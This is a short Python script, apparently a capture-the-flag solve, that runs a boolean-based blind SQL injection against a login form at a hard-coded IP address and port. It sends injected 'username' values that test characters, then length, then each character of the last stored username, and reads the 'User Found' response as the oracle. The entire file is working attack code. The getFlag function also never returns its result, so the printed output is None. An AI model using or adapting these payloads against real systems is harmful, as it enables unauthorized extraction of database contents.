import requests as r
import string

def filterChar(TARGET,CHAR):
    f = ""
    for key in CHAR:
        print(f"\rFiltered : {f+key}\r",end='')
        payload = f"admin' AND (SELECT username from user ORDER BY id DESC LIMIT 1) LIKE BINARY '%{key}%"
        req = r.post(TARGET, data={"username":payload})
        if "User Found" in req.text:
            f += key
    return f

def getLength(TARGET):
    print()
    for i in range(1,1000):
        print(f"\rLength : {i}\r",end='')
        payload = f"admin' AND LENGTH((SELECT username FROM user ORDER BY id DESC LIMIT 1)) = {i} -- -"
        req = r.post(TARGET, data={"username":payload})
        if "User Found" in req.text:
            return i

def getFlag(TARGET, filter_chr, length):
    flag = ""
    print()
    for a in range(1,length+1):
        for key in filter_chr:
            # print()
            print(f"\rFlag : {flag + key}\r",end='')
            payload = f"admin' AND ASCII(SUBSTRING((SELECT username FROM user ORDER BY id DESC LIMIT 1), {a}, 1)) = {ord(key)} -- -"
            req = r.post(TARGET, data={"username":payload})
            if "User Found" in req.text:
                flag += key

def main():
    TARGET = "http://108.181.154.136:9021/"
    CHR = string.ascii_letters + string.digits + "{_}"
    flagku = getFlag(TARGET, filterChar(TARGET, CHR), getLength(TARGET))
    print (flagku)
if __name__ == "__main__":
    main()
